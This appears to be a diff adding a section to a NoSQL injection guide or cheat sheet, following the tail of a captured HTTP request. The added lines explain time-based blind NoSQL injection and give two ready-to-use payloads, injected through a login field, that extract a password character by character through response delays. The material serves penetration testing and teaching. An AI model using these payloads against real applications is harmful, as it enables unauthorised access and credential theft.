@@ -284,3 +284,14 @@ Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Windows"
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0
+```
+
+One of the last methods involve time based nosql. This is done when no differences in web page is visible irrespective of change in inputs.
+
+Some payloads to exfiltrate data using timing based nosql : 
+```
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+```
+```
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
